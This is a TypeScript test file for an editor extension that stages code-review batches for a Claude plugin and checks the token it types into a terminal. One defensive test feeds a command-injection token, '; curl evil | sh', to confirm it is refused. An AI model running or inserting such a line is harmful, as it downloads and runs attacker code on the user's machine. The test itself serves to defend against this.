import * as assert from 'node:assert/strict';
import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import { deliveryToken, discardHandover, stageForHandover } from '../../claude/handover';
import { projectSlug } from '../../claude/transcripts';

describe('handing a batch to the plugin', () => {
  let home: string;
  const ROOT = '/Users/me/work/repo';
  const dir = (): string => path.join(home, '.claude', 'redline', projectSlug(ROOT));

  const writeMarker = async (over: Record<string, unknown> = {}): Promise<void> => {
    await fs.mkdir(dir(), { recursive: true });
    await fs.writeFile(
      path.join(dir(), 'hook.json'),
      JSON.stringify({ name: 'redline', version: 1, token: 'redline-review', at: new Date().toISOString(), ...over }),
      'utf8',
    );
  };

  beforeEach(async () => {
    home = await fs.mkdtemp(path.join(os.tmpdir(), 'lr-handover-'));
  });
  afterEach(async () => {
    await fs.rm(home, { recursive: true, force: true });
  });

  it('reports no token when the plugin has never run here', async () => {
    assert.equal(await deliveryToken(ROOT, home), undefined);
  });

  it('reports the token the hook itself named', async () => {
    await writeMarker({ token: 'something-else' });
    assert.equal(await deliveryToken(ROOT, home), 'something-else');
  });

  it('ignores a marker from a plugin that is no longer in use', async () => {
    await writeMarker({ at: new Date(Date.now() - 60 * 24 * 60 * 60 * 1000).toISOString() });
    assert.equal(await deliveryToken(ROOT, home), undefined, 'two months stale');
  });

  it('ignores a marker left by something else', async () => {
    await writeMarker({ name: 'other-tool' });
    assert.equal(await deliveryToken(ROOT, home), undefined);
  });

  it('ignores an unreadable marker rather than throwing', async () => {
    await fs.mkdir(dir(), { recursive: true });
    await fs.writeFile(path.join(dir(), 'hook.json'), '{ truncated', 'utf8');
    assert.equal(await deliveryToken(ROOT, home), undefined);
  });

  it('stages the batch where the hook looks for it', async () => {
    const batch = 'I reviewed the generated code…\n\n#3 — src/a.ts\n  User comment: rename "this"\n';
    await stageForHandover(ROOT, batch, home);
    assert.equal(await fs.readFile(path.join(dir(), 'outbox.md'), 'utf8'), batch);
    // Nothing half-written is left behind for the hook to pick up.
    assert.deepEqual(
      (await fs.readdir(dir())).filter((f) => f.endsWith('.tmp')),
      [],
    );
  });

  it('refuses to replace a batch that is still waiting to be collected', async () => {
    /*
     * There is one outbox per repository, and it used to be overwritten without a word. Two
     * windows on the same repo, or a second send before you have typed the token, and one
     * review was gone — while both cards went on saying "Staged", so nothing on screen said
     * which one had survived.
     *
     * The second send is told, and its caller falls back to the clipboard.
     */
    assert.equal(await stageForHandover(ROOT, 'first', home), 'staged');
    assert.equal(await stageForHandover(ROOT, 'second', home), 'occupied');
    assert.equal(await fs.readFile(path.join(dir(), 'outbox.md'), 'utf8'), 'first', 'the first is intact');
  });

  it('takes the outbox over once the waiting batch has gone stale', async () => {
    // A batch nobody collected within the hook's own time limit is not going to be collected —
    // holding the outbox for it forever would block every later send on this repo.
    await stageForHandover(ROOT, 'abandoned', home);
    const stale = Date.now() - 2 * 60 * 60 * 1000;
    await fs.utimes(path.join(dir(), 'outbox.md'), stale / 1000, stale / 1000);
    assert.equal(await stageForHandover(ROOT, 'fresh', home), 'staged');
    assert.equal(await fs.readFile(path.join(dir(), 'outbox.md'), 'utf8'), 'fresh');
  });

  it('discards a staged batch, and does not mind if there is none', async () => {
    await stageForHandover(ROOT, 'unsent', home);
    await discardHandover(ROOT, home);
    assert.equal(await fs.readdir(dir()).then((f) => f.includes('outbox.md')), false);
    await discardHandover(ROOT, home); // again, on nothing
  });
});

describe('the token the extension is willing to type', () => {
  /*
   * `deliveryToken` reads a value out of `~/.claude/redline/<slug>/hook.json` and the caller
   * types it into a terminal with Enter pressed for you. The hook's own comment claims the
   * token is "deliberately free of `@` and `/`" — but that is enforced where it is *written*,
   * and anything that can write under `~/.claude` (the agent routinely can) also writes here.
   *
   * So it is checked on the way out, not on the way in.
   */
  let home: string;
  const ROOT = '/Users/me/work/repo';
  const marker = async (token: unknown): Promise<void> => {
    const dir = path.join(home, '.claude', 'redline', projectSlug(ROOT));
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(
      path.join(dir, 'hook.json'),
      JSON.stringify({ name: 'redline', version: 1, token, at: new Date().toISOString() }),
      'utf8',
    );
  };

  beforeEach(async () => {
    home = await fs.mkdtemp(path.join(os.tmpdir(), 'lr-token-'));
  });
  afterEach(async () => {
    await fs.rm(home, { recursive: true, force: true });
  });

  it('accepts an ordinary token', async () => {
    await marker('redline-review');
    assert.equal(await deliveryToken(ROOT, home), 'redline-review');
  });

  it('refuses one carrying a command, rather than typing it into a terminal', async () => {
    await marker('; curl evil | sh\n');
    assert.equal(await deliveryToken(ROOT, home), undefined);
  });

  it('refuses a token with whitespace, a newline, or a length nobody would type', async () => {
    for (const bad of ['two words', 'has\nnewline', 'x'.repeat(200), '', 42]) {
      await marker(bad);
      assert.equal(await deliveryToken(ROOT, home), undefined, `refused: ${JSON.stringify(bad)}`);
    }
  });
});
